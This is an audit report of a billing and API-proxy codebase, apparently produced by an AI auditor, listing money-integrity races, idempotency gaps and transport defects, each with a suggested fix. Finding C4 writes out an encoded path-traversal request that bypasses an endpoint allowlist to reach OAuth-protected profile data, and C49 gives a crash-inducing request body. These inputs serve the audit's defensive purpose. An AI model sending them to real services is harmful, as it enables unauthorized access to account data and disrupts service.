# FULL_AUDIT_M — Full-project audit (engine · backend · frontend · connections)

> **Historical finding set:** Stage 2 PostgreSQL authority and blue-green rollout were implemented
> after this snapshot. Request-keyed reservations, durable settlement outbox, unique charge identity,
> owner epochs, capacity leases, CAS pool state, and PostgreSQL leader leases supersede the SQLite
> mechanisms discussed below. Current behavior is in `docs/engine/STAGE2_POSTGRES_AUTHORITY.md` and
> `docs/ops/DEPLOYMENT.md`.

**Date:** 2026-07-16  **Audited at:** `master` @ `59ae42c`  **Auditor:** Claude (Opus 4.8, 1M) with a
parallel multi-agent workflow harness.

> **Freshness caveat:** this audit was performed against `59ae42c`. `master` has since advanced to
> `e0f85db` ("perf(engine): scale fixes — settle+usage one txn, alloc-free pick, key_auth TTL cache"),
> which modifies `crates/registry/src/lib.rs` and `crates/server/src/main.rs`. **Line numbers in the
> registry/server findings may have shifted, and some concurrency/settlement items (e.g. C1, C11, C56,
> and the settle+usage transaction boundary) may be partially addressed** — re-verify the engine
> registry/server findings against current `HEAD` before acting.

## Scope & method

Three layers plus the seams between them:

- **Rust engine** — `crates/registry`, `crates/pool`, `crates/forward` (transport + billing/metering),
  `crates/server`, `crates/metering` (~6.8k LoC).
- **Commercial TS backend** — `apps/api` (NestJS), `apps/worker`, `packages/{db,contracts,engine-client,payments}` (~9k LoC).
- **Web frontend** — `apps/web` (Next.js App Router) logic **and** rendered styles on every page/section (~6k LoC).
- **Cross-cutting** — layer connections (frontend↔backend↔engine), the money units chain, auth/identity
  boundary, and secrets/config hygiene.

**How this audit was run**

1. **Code audit** — 14 deep, file-scoped finder agents (one per subsystem + two cross-cutting) ran in
   parallel, each judging against the project's own invariants (transparency, dependency direction,
   integer-only money, session/verification gating, `CONTROL_KEY` server-only, charge-ledger-derived
   pricing). **Every** raw finding was then re-checked by a 2-lens adversarial panel (a *correctness*
   verifier trying to refute the mechanism, and an *impact* verifier judging reachability/harm). Only
   findings that survived are kept. Totals: **110 raw → 109 survived, 1 refuted** across **234 agents**.
2. **Visual audit** — the site was built and captured at 51 screenshots (all pages × light/dark ×
   desktop/tablet/mobile × EN/RU) via the repo's CDP capture tool, then reviewed by 12 design/QA agents
   → **31 visual findings**.
3. **Independent vetting** — I personally read the highest-stakes files (billing actor, auth service,
   engine client, Cryptomus path, guards, bootstrap, pricing) and verified/qualified the headline
   findings against source. My corrections and additions are called out in **§4**.

**Verification status legend:** `CONFIRMED` = both adversarial lenses (or the surviving lens) agreed the
defect is real and reachable. `PLAUSIBLE` = survived but with lower confidence / partial verification
(includes 8 findings whose second verifier was auto-blocked by a content filter — treat as needing a
human second look). Severities are the panel-adjusted values.

> **Read this with two caveats.** (a) The code findings below are **workflow-verified**, not all
> hand-verified by me; I independently confirmed the items in §4 and spot-checked several headline
> claims, but the long catalog in §6 should be triaged, not taken as 109 independent must-fixes.
> (b) Overlapping finders reported the **same root issue** from different angles — the catalog is
> deduped into **themes in §3**, which is the real priority list.

---

## 1. Headline

The system is **mature and carefully built** — the crown-jewel paths (the async billing actor with RAII
refunds + crash reconcile, argon2id auth with no-session-before-verification, the json-bigint engine
client, and the signal-only/re-fetch Cryptomus webhook) are deliberate and largely correct. **No
critical (immediately exploitable, unauthenticated) issues were found.** The 0-critical / 36-high result
is dominated by **money-integrity edge cases** (idempotency, refunds, reservation races, streaming
metering accuracy) and **deployment/config hardening**, not by broken fundamentals.

| Severity | Code | Visual |
|---|---|---|
| Critical | 0 | 0 |
| High | 36 | 2 |
| Medium | 55 | 10 |
| Low | 18 | 19 |
| **Total** | **109** | **31** |

By subsystem (code): registry 8 · pool 9 · forward-transport 10 · forward-billing 7 · server 9 · auth 2 ·
account+engine 5 · payments 3 · pricing+worker 12 · admin+infra 8 · frontend-logic 9 · frontend-auth 3 ·
connections 10 · secrets+config 14.

---

## 2. Highest-priority fixes (start here)

1. **Reconcile the B2C tier model to one source of truth** (T1). Today: the *worker* consumes the
   authoritative engine charge-ledger, but tier *advancement* uses `tierForTopups(cumulative_topup_nano)`
   (top-ups), the frontend uses thresholds **$100/$250/$500/$1000**, and **docs/commerce/PRICING.md** says advancement
   is *spend*-based at **$25/$75/$200/$500**. These disagree. Pick spend-or-topup, one threshold set, and
   make worker + db + frontend + docs/commerce/PRICING.md agree. *(C15, C16, C22, C28, C70, C74; verified in §4.)*
2. **Make credit application and refunds exactly-once against the engine** (T2). Duplicate/replayed
   webhooks, stale worker leases, and refunded/disputed payments can double-credit or fail to reverse the
   engine balance. *(C13, C14, C17, C21, C23, C24, C29, C66, C80.)*
3. **Fix reservation identity so reconciliation can't refund live holds** (T3) — aggregate-per-account
   holds + a global reconcile let an overlapping instance expose reserved funds as spendable; the PID
   guard is a non-atomic `/proc` check that is a no-op on macOS. *(C1, C11, C37, C54.)*
4. **Close streaming/metering accuracy gaps** (T4) — SSE disconnect undercount, non-stream abort loses
   usage, **Sonnet-5 overcharged 50%** in the intro window, US-residency 1.1× omitted. *(C5, C8, C9, C10,
   C53, C55, C56.)*
5. **Harden secrets/config for deploy** (T5) — reject known placeholder admin keys at startup, require
   `https` for the engine/Control-key URL, validate `CLAUDE_API_UPSTREAM`, keep the OAuth token out of
   child-process env, widen `.gitignore` dotenv globs, forbid plaintext SMTP/PG in prod. *(C25, C31–C36,
   C84–C91.)*
6. **Keep secret tokens/keys out of URLs & history** (T6) — raw `sk-pool-…` in docs-prefill URLs,
   reset/verify tokens in the address bar, legacy revoke route with the key in the path. *(C27, C78, C79,
   C97.)*

---

## 3. Cross-cutting themes (deduped)

- **T1 — Tier source-of-truth inconsistency:** C15, C16, C22, C28, C70, C74.
- **T2 — Idempotency / exactly-once (credits & refunds):** C13, C14, C17, C19, C21, C23, C24, C29, C66, C80.
- **T3 — Reservation & reconciliation race (money integrity):** C1, C11, C37, C54.
- **T4 — Streaming & metering accuracy:** C5, C8, C9, C10, C48, C53, C55, C56.
- **T5 — Secrets & config hardening:** C25, C31, C32, C34, C35, C36, C84, C85, C86, C87, C88, C89, C90, C91.
- **T6 — Secret tokens/keys in URLs & history:** C27, C78, C79, C85, C97.
- **T7 — JavaScript-number money precision leaks:** C58, C76, C100, C103, C107, C108.
- **T8 — Engine transparency-invariant edges:** C4, C6, C7, C48, C51, C52.
- **T9 — Worker/process durability (crash-restart, unhandled rejection):** C12, C67, C68, C69, C82.

---

## 4. Auditor's independently-verified items & corrections

These I confirmed (or corrected) against source myself:

- **✅ NEW — Tier-progress bar math is wrong (not in the code-audit set; found via the visual pass and
  root-caused).** `pricingMilestoneProgress(currentTier, spentNano)` in `apps/web/src/lib/pricing-tiers.ts`
  returns `((index+1+within)/segments)*100`, but the milestone dots are laid out in a 5-column grid on a
  track spanning 10%→90%, so **Builder sits at 25% of the line**. For `starter` + $12 the formula yields
  **22.4%**, painting the fill almost onto Builder; at **$0 spent it already shows 20%**. Correct formula
  for this layout: `(index + within)/(segments−1)*100` → 3% for $12, 0% for $0. Misrepresents progress to
  the next discount tier. **Medium.** (Corresponds to visual V7.)
- **✅ CONFIRMED — Tier model inconsistency (T1).** docs/commerce/PRICING.md §top says advancement is spend-based at
  $25/$75/$200/$500 and "never estimates spend from browser data"; but `packages/db/src/pricing.ts`
  advances via `tierForTopups(cumulative_topup_nano)` and the frontend thresholds are $100/$250/$500/$1000.
  The worker *does* read the ledger (`getLedgerAfter` cursor) for the retention window — so the model is a
  hybrid that contradicts its own spec. Real and important.
- **✅ CONFIRMED (framing corrected) — "Known admin keys" (C34/C91) are placeholders, not committed live
  secrets.** `server.env.example` ships `CLAUDE_API_KEYS=put-a-long-random-key-here,…`. The risk is a deploy
  left unchanged + no startup guard rejecting known placeholder values — real, but it is a deployment
  footgun (Medium), not a leaked production secret.
- **✅ Verified sound (NOT findings):**
  - The billing actor (`crates/forward/src/billing.rs`) — single-writer discipline, RAII hold refunds on
    cancel, `reconcile` on crash — is well-designed. (The T3 race is a *multi-instance* edge on top of it.)
  - Auth (`apps/api/src/auth.service.ts`) — argon2id at OWASP params, dummy-hash timing defense, **no
    session/engine account before email verification**, PKCE+nonce+state OAuth, hashed tokens, AES-GCM
    outbox, per-email+IP rate limits. Solid.
  - Engine client (`packages/engine-client`) — `json-bigint`, control key server-side header only, Zod
    validation, bigint amounts, timeouts.
  - Cryptomus webhook — signal-only, signature MD5-verified constant-time, **amount re-fetched
    authoritatively** and forced to whole USD.
  - `OriginGuard`/`SessionAuthGuard` — exact single-origin CSRF check + `__Host-` cookie prefix, identity
    from session (never client `user_id`).
- **ℹ️ Non-issues I ruled out:**
  - *Missing global `ValidationPipe`* is intentional — controllers take `@Body() body: unknown` and validate
    with **Zod**. Not a gap.
  - *Russian UI "broken" in the first capture runs* was **a dead dev server** (all shots were Chrome
    `ERR_CONNECTION_REFUSED`), not a product bug — RU renders correctly once captured against a healthy
    server. Root cause: the visual-audit command in `apps/web/README.md` uses `next start` but the `next`
    binary is under `apps/web/node_modules/.bin`, not repo root, so the server silently never started.
    **Minor doc/tooling fix**: document `pnpm --filter @claude-api/web exec next start -p 3001` and have the
    capture tool fail fast if the first shot is an error page.

---

## 5. Notes on confidence

- **7 findings are `PLAUSIBLE`** (C4, C26, C62, C95, C96, C102, C103) — lower confidence; verify before acting.
- **8 verifier agents were auto-blocked** by a cybersecurity content filter (engine transport/billing,
  fe-logic, x-secrets). Their findings survived on the remaining lens; give C4–C10 / secrets items a human
  second read.
- The catalog in §6 preserves each finding's `file:line`, failure scenario, and suggested fix verbatim from
  the verified workflow output.

---

## 6. Code findings — full catalog (verified)

Grouped by subsystem, highest severity first. `Cn` numbers match the theme references above.

### Engine · Registry (SQLite balance/ledger)  

**C1. [HIGH · CONFIRMED] Global reconciliation can refund live holds and let concurrent requests overspend**  
`crates/registry/src/lib.rs:405` — _race-condition_  
Reservations are stored only as one aggregate per account. `reconcile_reservations` refunds every aggregate hold without an owner, request ID, age, or lease check, while `account_settle` later consumes `MIN(hold, reserved_nano)` from whatever aggregate happens to exist. A startup/rolling-deploy overlap can therefore make an old settlement consume a newer request's hold, temporarily expose reserved funds as spendable, and permit completed usage beyond the funded balance.  
- **Failure:** An account starts with 1,000 nano. An old instance reserves 600, leaving balance=400/reserved=600. A new instance reconciles while the old request is still live, producing balance=1,000/reserved=0. A new request then reserves 500, producing balance=500/reserved=500. The old request settles with hold=600 and actual=100; `MIN(600,500)` refunds the unrelated new hold, producing balance=900/reserved=0. Another request can now reserve those 900 nano even though the 500-nano request is still in flight. Later settlements can drive the account negative after upstream usage has already been delivered, violating race-safe `charge <= hold <= balance` enforcement.  
- **Fix:** Persist each hold as a reservation row keyed by a unique request/reservation ID, including owner/lease timestamps and state. Settle exactly that row once in the same transaction as the balance and ledger update. Reconcile only expired reservations whose owner is provably dead; never zero all account reservations globally.  

**C2. [HIGH · CONFIRMED] A failed idempotency-index migration is silently ignored, allowing repeated payment credits**  
`crates/registry/src/lib.rs:109` — _migration-idempotency_  
Creation of the unique top-up reference index discards every error. In particular, upgrading a pre-index database that already contains duplicate top-up references makes `CREATE UNIQUE INDEX` fail with a constraint violation, but `open` still succeeds and the service runs with no database-enforced payment replay protection.  
- **Failure:** A legacy database contains two `ledger` top-up rows with `ref='payment_123'`, created before the unique index existed. On upgrade, index creation fails because of those duplicates, but the error is ignored. A replayed webhook with `ref='payment_123'` then executes the account balance update and inserts another ledger row successfully, crediting the same payment again on every replay.  
- **Fix:** Run schema migrations transactionally and propagate errors for correctness-critical indexes. Detect and resolve legacy duplicates explicitly, then verify the expected unique index exists before accepting billing traffic.  

**C37. [MEDIUM · CONFIRMED] Settlement does not enforce actual charge less than or equal to the reserved hold**  
`crates/registry/src/lib.rs:542` — _balance-enforcement_  
`account_settle` normalizes negative values but never rejects or bounds `actual_nano > hold_nano`. It refunds at most the hold and then subtracts the full actual charge, so a stale reserve-price table, newly introduced upstream model price, malformed usage result, or caller regression can debit beyond the amount atomically approved against the balance.  
- **Failure:** With balance=100 and reserved=0, `account_reserve(id, 100)` succeeds and leaves balance=0/reserved=100. Calling `account_settle(id, key, 100, 150, ref)` then computes `0 + 100 - 150`, committing balance=-50 after service has already been delivered. The documented invariant `charge <= hold <= balance` is broken inside the registry rather than rejected at the money boundary.  
- **Fix:** Make `actual > hold` an explicit settlement error and leave the reservation intact for controlled recovery, or introduce a separately audited debt path. Enforce the condition in the same transaction/SQL statement so no caller can bypass it.  

**C38. [MEDIUM · CONFIRMED] WAL synchronous NORMAL can lose acknowledged balance and ledger commits on power failure**  
`crates/registry/src/lib.rs:50` — _financial-durability_  
The sole money database is configured with `synchronous=NORMAL`. In WAL mode this preserves consistency but may lose recently acknowledged commits after an OS crash or power loss. The comment assumes only a final reservation needs reconciliation, but the same durability setting applies to top-ups, settled charges, account status changes, and ledger rows; reconciliation cannot reconstruct those commits.  
- **Failure:** A payment top-up transaction commits and the Control API reports the new balance to commerce, but the machine loses power before the WAL is durably synchronized/checkpointed. After restart, both the credited balance and its ledger row can be absent even though commerce recorded the operation as successful. Conversely, settled usage charges can disappear, restoring spendable balance and granting unbilled usage.  
- **Fix:** Use `synchronous=FULL` for the authoritative money database, or isolate performance-sensitive nonfinancial state in another database while keeping balances and ledger fully durable. Add crash/power-loss recovery semantics that do not assume only reservations can be lost.  

**C39. [MEDIUM · CONFIRMED] Legacy migration merges different wallets when keys share the same 12-character suffix**  
`crates/registry/src/lib.rs:163` — _migration-account-isolation_  
Legacy account IDs are derived solely from the final 12 characters of the secret key. Two distinct legacy keys with the same suffix map to the same account ID; `INSERT OR IGNORE` suppresses the collision and both keys are then linked to that one account. This crosses wallet ownership boundaries and discards one key's migrated balance/spend state.  
- **Failure:** Legacy keys `sk-pool-userA-123456789abc` and `sk-pool-userB-123456789abc` have separate balances. Migration creates `acct_123456789abc` for the first row. The second account insert is ignored, but its key is still updated to `account_id='acct_123456789abc'`. Both users can now authenticate to and spend the first wallet, while the second wallet's balance was never transferred.  
- **Fix:** Use a collision-resistant identifier derived from the full key, such as a cryptographic hash with domain separation, or generate a random account ID and persist the mapping. Perform each migration in a transaction and abort if the proposed account ID already belongs to another key.  

**C40. [MEDIUM · CONFIRMED] Negative balance adjustments are replayable even when a reference is supplied**  
`crates/registry/src/lib.rs:509` — _idempotency_  
`account_topup` supports negative corrections and accepts a reference, but negative amounts are recorded as `adjust`. The only uniqueness rule applies to `kind='topup'`, so retrying an adjustment after a timeout applies it repeatedly despite using the same operation reference.  
- **Failure:** An operator or control-plane client submits `amount_nano=-10_000_000_000, ref='correction_42'`. The transaction commits but the response is lost, so the client retries the identical operation. Both inserts are `kind='adjust'`, both succeed, and the account is debited $20 instead of $10.  
- **Fix:** Require a nonempty idempotency reference for every retryable monetary mutation and enforce uniqueness for adjustments as well, preferably with an operation table that stores the account, amount, kind, and original result.  

**C41. [MEDIUM · CONFIRMED] Pruning charge rows can permanently skip entries for durable ledger consumers**  
`crates/registry/src/lib.rs:611` — _ledger-retention_  
`ledger_after` is documented as the cursor API for durable external consumers, but `ledger_prune` deletes charge rows solely by timestamp and has no consumer acknowledgement watermark. A lagging or recovering pricing consumer can therefore lose unconsumed authoritative charge events permanently, causing undercounted B2C pricing state.  
- **Failure:** A commerce pricing worker has consumed through ledger ID 100 and is unavailable longer than the configured retention window. During the outage, charge IDs 101-200 age past `older_than_ts` and are deleted. When the worker resumes with `after_id=100`, it receives only later surviving rows and has no way to discover or reconstruct charges 101-200, so monthly spend/tier calculations omit them.  
- **Fix:** Track durable consumer checkpoints and prune only rows acknowledged by every required consumer, or archive charge rows to immutable storage before deletion. Surface detectable cursor gaps instead of silently continuing.  

**C42. [MEDIUM · CONFIRMED] Reusing an idempotency reference with different parameters is reported as success**  
`crates/registry/src/lib.rs:517` — _idempotency-parameter-mismatch_  
Any unique-reference collision is treated as an idempotent retry without checking that the existing ledger row has the same account and amount. The attempted balance update is rolled back, then the function returns the target account's current balance as `Ok(Some(...))`, which is indistinguishable from a successful credit to the Control API caller.  
- **Failure:** Payment reference `tx_ABC` previously credited account A with $10. Due to a routing or provider-namespacing error, a later request tries to credit account B with $20 using `tx_ABC`. The insert conflicts and the transaction rolls back, but `account_topup` returns B's current balance successfully; the HTTP layer responds 200, so commerce can mark B's $20 payment delivered even though no credit occurred. The same issue occurs when the amount changes for the same account/reference.  
- **Fix:** On a reference conflict, query the existing operation and return the stored original result only if account, amount, and kind exactly match. Return an explicit conflict/error for parameter mismatches, and distinguish the specific unique-reference violation from unrelated constraints.  


### Engine · Pool (rotation)  

**C3. [HIGH · CONFIRMED] A later short failure can erase an existing days-long cooldown**  
`crates/pool/src/lib.rs:495` — _limit-enforcement_  
Both cooling methods replace `cooling_until` unconditionally instead of extending it monotonically. Multiple requests may already be in flight on one subscription, so their outcomes can arrive out of order. A short network/burst cooldown that arrives after a quota cooldown shortens the ban and makes the pool reuse an account before its authoritative reset.  
- **Failure:** Two requests are in flight on A. The first receives a weekly-quota 429 and calls `mark_cooling("A", 259200)`. The second later fails at the network layer and the traced forward path calls `mark_cooling("A", 15)`, or returns a headerless burst 429 and calls it with 20. The assignment changes A from cooling for three days to cooling for only 15–20 seconds; traffic resumes against the still-exhausted weekly window and produces repeated 429s.  
- **Fix:** Set `cooling_until = cooling_until.max(now() + secs.max(1))`. Only a distinct, explicit recovery operation should be allowed to shorten or clear a live cooldown.  

**C43. [MEDIUM · CONFIRMED] Selection and in-flight reservation are not atomic**  
`crates/pool/src/lib.rs:378` — _race-condition_  
`pick`/`route` choose under the pool mutex, but the in-flight slot is incremented later by a separate `mark_used` call. The traced caller in `/Users/3xcalibur/Desktop/IT/Vibecode/Claude_API/crates/forward/src/proxy.rs:537-556` performs exactly this split. On a multi-thread Tokio runtime, other requests can select using the stale in-flight count after the selection lock is released but before `mark_used` reacquires it, so `MAX_INFLIGHT` is not race-safe.  
- **Failure:** Subscription A has `inflight=5`, subscription B has less free capacity, and two new sessions arrive on different worker threads. Both calls to `route` can independently observe `5 < MAX_INFLIGHT` and return A before either caller executes `mark_used`; the two increments then leave A at 7, exceeding the stated ceiling of 6. Larger simultaneous bursts can overshoot further and send an account into concurrency/rate-limit failures.  
- **Fix:** Expose a single acquire operation that selects and increments `inflight` while holding the same mutex, returning a lease/guard identifying the selected subscription. Make both route-first and retry selection use that operation; remove the caller-visible choose-then-`mark_used` sequence.  

**C44. [MEDIUM · CONFIRMED] Retry selection does not enforce the concurrency envelope**  
`crates/pool/src/lib.rs:263` — _fairness-starvation_  
`select_best`, used by `pick` for retries and non-session traffic and by route spill, never filters on `MAX_INFLIGHT`. In-flight count is only a late tie-breaker after exact 7d and 5h utilization comparisons, so a slightly cooler account is selected even when it is far beyond the intended concurrency ceiling and another account is idle.  
- **Failure:** A has `util7d=0.10`, `util5h=0.10`, and `inflight=20`; B has `util7d=0.11`, `util5h=0.00`, and `inflight=0`. Both are under reserve caps. Every `pick` chooses A because the comparator resolves on 7d utilization before reaching the in-flight comparison. Retry/non-session bursts continue loading A and can starve B until a utilization header changes.  
- **Fix:** Apply `inflight < MAX_INFLIGHT` as a normal selection stage for `select_best`, relaxing it only when every non-cooling candidate is at the envelope. When relaxing, prioritize the lowest in-flight count before small utilization differences.  

**C45. [MEDIUM · CONFIRMED] Rotation ignores locally known spend between utilization headers**  
`crates/pool/src/lib.rs:250` — _quota-accounting_  
`record_spend` records usage specifically to provide live utilization between headers, and `capacity()` incorporates that delta, but all actual routing predicates and ordering use `eff_util`, which reads only the last raw header value. The pool can therefore knowingly route beyond its reserve threshold until another response supplies a fresh header.  
- **Failure:** A has calibrated 5h capacity of $50, last header utilization 0.85, and a reserve cap of 0.90. A completed request then records $5 of spend, making locally known live utilization 0.95. Before another header arrives, `route` still sees `e5=0.85`, does not rebind, and `pick` still treats A as under cap, sending more traffic into exhausted headroom.  
- **Fix:** Create one live effective-utilization function that combines the last header, post-header spend, calibrated/prior capacity, and rollover. Use it consistently in `select_best`, `place_best`, pinned-home cap checks, and `capacity()`.  

**C46. [MEDIUM · CONFIRMED] Spill can choose a cooling alternative and report false fleet exhaustion**  
`crates/pool/src/lib.rs:419` — _rotation-correctness_  
When a session home is merely busy, route excludes it and calls `select_best`. If every alternative is cooling, `select_best` deliberately relaxes its cooling filter and returns a cooling subscription, so the `.or_else` fallback to the non-cooling home is never reached. The forward layer then fast-rejects the request as if all subscriptions were rate-limited.  
- **Failure:** Session S is bound to A. A is healthy but has `inflight=6`; B is cooling until tomorrow. `route(S)` enters the busy spill branch, excludes A, and `select_best` returns B because B is the only candidate even though it is cooling. Forward sees B cooling and returns `429 all subscriptions are rate-limited` with a Retry-After near one day, although A is not rate-limited and may free a slot seconds later.  
- **Fix:** Use a strict non-cooling selector for spill. If no non-cooling alternative exists, either return the healthy home under the documented relaxation policy or return a distinct short concurrency-backoff result based on active slots; do not turn an internal busy condition into the cooling subscription's long Retry-After.  

**C47. [MEDIUM · CONFIRMED] Cooling state is skipped when a subscription is inactive during restart**  
`crates/pool/src/lib.rs:676` — _state-persistence_  
In-memory roster replacement deliberately retains cooling for temporarily absent subscriptions, but restart import only accepts rows whose email is in the currently active roster. If a subscription is paused or moved out of the selected fleet during a deployment and is reactivated before its ban expires, the running pool never imports its durable cooling row.  
- **Failure:** A receives a 7-day-limit 429 and is cooled for two days. Operations pause A, then deploy the service while A is inactive. `import_state` skips A because it is not in `g.subs`. Ten minutes later A is reactivated and `replace_subs` adds it, but no state reload occurs; A has default live state and immediately receives production traffic despite the original cooldown still having nearly two days remaining.  
- **Fix:** Retain imported durable rows for inactive emails in `live` when their cooling is still relevant, or keep a dormant-state map and merge it whenever `replace_subs` activates an email. Do not discard a future cooldown merely because the subscription is inactive at process start.  

**C92. [LOW · CONFIRMED] Restored calibration can span a completed reset window**  
`crates/pool/src/lib.rs:693` — _capacity-calibration_  
`import_state` unconditionally seeds calibration anchors from persisted utilization even when the persisted reset timestamp is already in the past. `calib_window` detects rollover only when the new utilization is numerically lower than the old anchor; it does not receive or compare reset timestamps. A new window whose utilization has already risen above the stale anchor is incorrectly calibrated as a continuation of the previous window.  
- **Failure:** Persisted A has `util5h=0.10`, `reset5h` in the past, and cap $50. After restart, A spends $10 in the new window and the first fresh header reports `util5h=0.20` with a new future reset. The correct observation is $10/0.20=$50, but the restored anchor makes the code use delta 0.10 and observe $100, moving the EMA cap to $65. Repeated restarts around resets can materially distort capacity-weighted placement.  
- **Fix:** On import, leave an anchor unseeded when its persisted reset is not in the future. In `set_util`, compare the previous/new reset identity before calibration and reseed whenever the window reset changed or passed, regardless of the numerical relation between old and new utilization.  

**C93. [LOW · CONFIRMED] A probe without utilization erases known post-header spend**  
`crates/pool/src/lib.rs:558` — _capacity-accounting_  
`set_util` always advances the shared `spent_at_header_usd` anchor even when neither utilization value is present. The server intentionally calls `set_util(...None...)` after failed probes merely to update `polled_ts`, so such a probe discards locally recorded spend without receiving a replacement utilization header.  
- **Failure:** A's last valid header says 5h utilization 0.50 with $50 capacity. A then records $5 spend, so `capacity()` correctly reports 0.60. A concurrently launched liveness probe fails and calls `set_util(A, None, None, None, None, None)`. The method moves `spent_at_header_usd` to the current total while retaining raw utilization 0.50, so reported live utilization drops back to 0.50 and available capacity is overstated by $5.  
- **Fix:** Advance the spend anchor only when a corresponding utilization header was observed. Because either window may be absent independently, maintain separate post-header spend anchors for 5h and 7d.  

**C94. [LOW · CONFIRMED] Retry-After considers cooling subscriptions outside the active roster**  
`crates/pool/src/lib.rs:523` — _retry-timing_  
`soonest_ready` scans every `Live` entry, but `replace_subs` deliberately retains cooling entries for subscriptions no longer in `g.subs`. The resulting minimum may belong to an account that cannot be selected, causing the gateway to advertise a Retry-After earlier than any active subscription can recover.  
- **Failure:** Active A is cooling for one hour. B was removed from the active roster but its retained live state is cooling for ten seconds. Selection can only return A, yet `soonest_ready()` returns 10. Forward sends `Retry-After: 10`; clients retry repeatedly for almost an hour even though no selectable subscription is ready.  
- **Fix:** Compute readiness only across emails present in the current `g.subs` roster, ideally restricted further to the candidate set relevant to the failed selection.  


### Engine · Forward transport (proxy/upstream/breaker)  

**C4. [HIGH · PLAUSIBLE] Percent-encoded dot segments bypass the OAuth endpoint allowlist**  
`crates/forward/src/proxy.rs:343` — _authorization-bypass_  
The allowlist validates the raw Axum path for literal `.` and `..` segments, then passes that raw path to an HTTP client whose URL parser normalizes percent-encoded dot segments. An authenticated customer can therefore escape `/v1/models/*` and make arbitrary GET requests with a pooled subscription's Bearer token.  
- **Failure:** A customer calls `GET /v1/models/%2e%2e/%2e%2e/api/oauth/profile`. `is_supported_endpoint` accepts it because the raw path starts with `/v1/models/` and its segments are `%2e%2e`, not literal `..`. URL normalization turns the outgoing request into `GET /api/oauth/profile`; line 575 adds the selected subscription's Bearer token, so the customer receives that subscription's account and organization profile. The same primitive can reach other GET endpoints authorized to the subscription OAuth token.  
- **Fix:** Percent-decode and canonicalize the path before authorization, reject encoded dot segments, encoded separators, and backslashes, and match the final canonical path. Prefer an exact `/v1/models/{single-model-id-segment}` matcher and verify the parsed outgoing URL's path still matches before attaching OAuth credentials.  

**C5. [HIGH · CONFIRMED] The per-account concurrency guard is released before response streams finish**  
`crates/forward/src/proxy.rs:392` — _rate-limit-bypass_  
`KeyGuard` is a local in `forward`. It is dropped as soon as the handler returns the `Response`, while Axum streams the body afterward. Thus `max_inflight_per_key` limits only requests waiting for upstream headers, not concurrent SSE or other long-lived response streams.  
- **Failure:** With `max_inflight_per_key=20`, one account opens 20 `stream:true` requests and waits until each returns HTTP 200 headers. Every `forward` invocation then returns and drops its `KeyGuard`, reducing the account's limiter count to zero although all 20 streams remain active. The account can repeat this indefinitely and maintain hundreds of simultaneous generations, bypassing fair-share protection and consuming the fleet's subscription concurrency.  
- **Fix:** Move the account limiter guard into a response-body wrapper that releases it on EOF, stream error, or `Drop`, analogous to `TeeMeter`. Non-streaming/error responses may release immediately, but every successful body must retain the guard for its full lifetime.  

**C6. [HIGH · CONFIRMED] The proxy advertises encodings it cannot decode, then removes the encoding marker**  
`crates/forward/src/upstream.rs:49` — _protocol-corruption_  
Every upstream request advertises `gzip, deflate, br, zstd`, but the forward crate enables only wreq's `gzip` and `brotli` decoding features. `stream_back` unconditionally strips `content-encoding`, so an upstream `deflate` or `zstd` response can be forwarded still compressed but labeled as an unencoded body.  
- **Failure:** Anthropic or its CDN selects `Content-Encoding: zstd` because the proxy explicitly advertised zstd. Wreq has no zstd decoder enabled, so `bytes_stream()` yields compressed bytes. `skip_resp_header` removes `content-encoding`; the downstream Anthropic SDK attempts to parse those bytes as JSON/SSE and fails. Successful metered responses also become unparsable to `TeeMeter`, potentially settling the reservation with zero usage.  
- **Fix:** Advertise only encodings that the client definitely decodes, or enable every advertised decoder. Track whether wreq actually decoded the response and remove `Content-Encoding` only in that case; otherwise preserve both the encoded bytes and the header. For strict byte transparency, disable automatic decompression and forward the raw body and encoding headers unchanged.  

**C7. [HIGH · CONFIRMED] Client beta capabilities are silently discarded**  
`crates/forward/src/proxy.rs:513` — _api-transparency_  
The request filter removes the client's `anthropic-beta` header and the forwarding path replaces it with a fixed Claude Code beta list. This breaks any supported Anthropic feature whose beta is not in that fixed list and can also opt clients into betas they did not request.  
- **Failure:** A client sends `anthropic-beta: task-budgets-2026-03-13` and an `output_config.task_budget` body. `skip_req_header` discards that header, and line 516 sends only `default_beta`, which does not contain the task-budget beta. Anthropic rejects the otherwise valid request as an unknown or unavailable field. Fast mode, server-side fallbacks, and future betas fail similarly.  
- **Fix:** Parse and merge client-requested beta tokens with the mandatory OAuth/Claude-Code beta tokens, deduplicate without dropping client values, and avoid adding unrelated feature betas. Preserve the client's requested semantics while injecting only the minimum OAuth identity requirement.  

**C48. [MEDIUM · CONFIRMED] Final upstream errors are replaced with synthetic bodies and headers**  
`crates/forward/src/proxy.rs:653` — _error-transparency_  
Retryable upstream responses are discarded and replaced with locally generated errors. When retries are exhausted, the client does not receive the last Anthropic status body, request ID, retry headers, or error type, violating the requirement that upstream errors remain indistinguishable from the Anthropic API.  
- **Failure:** With `max_tries=1`, Anthropic returns a 529 response containing its normal `overloaded_error`, `request_id`, and `Retry-After`. The proxy stores only `err_response(st, "overloaded_error", "upstream unavailable")` and returns that synthetic response after the loop. SDK diagnostics lose the real request ID and retry timing. Upstream 401/403 bodies are likewise replaced with `this request is not permitted`.  
- **Fix:** Retain the last upstream response until retry selection is complete and, if no retry succeeds, return its original status, headers, and body unchanged. Synthesize an Anthropic-shaped error only when no upstream response exists, such as a local connection failure or an empty pool.  

**C49. [MEDIUM · CONFIRMED] Malformed metadata can panic the request task instead of returning an Anthropic 4xx**  
`crates/forward/src/proxy.rs:598` — _panic_  
The code indexes `v["metadata"]["user_id"]` without ensuring that the parsed JSON root and `metadata` are objects. Serde JSON mutable string indexing panics when the existing value is a non-object, making untrusted invalid input terminate the handler task rather than flow to Anthropic validation.  
- **Failure:** An authenticated caller sends a syntactically valid body such as `{"model":"claude-haiku-4-5","max_tokens":1,"messages":[],"metadata":"x"}`. Parsing succeeds, the request reaches the per-subscription body mutation, and indexing `"user_id"` inside the string-valued metadata panics. Repeated requests cause connection resets and panic/log churn instead of stable `400 invalid_request_error` responses.  
- **Fix:** Validate the JSON root and `metadata` shape before mutation. Create an object only when metadata is absent or null; for an existing non-object, either pass the body unchanged so Anthropic returns its native validation error or return a controlled matching 400. Never use panicking index mutation on untrusted JSON shapes.  

**C50. [MEDIUM · CONFIRMED] Already-admitted requests ignore the circuit breaker after it opens**  
`crates/forward/src/proxy.rs:457` — _circuit-breaker-race_  
The breaker is checked once before entering the retry loop. Requests admitted concurrently while it is closed never re-check it, so they continue rotating and issuing additional upstream attempts even after other requests have opened the breaker.  
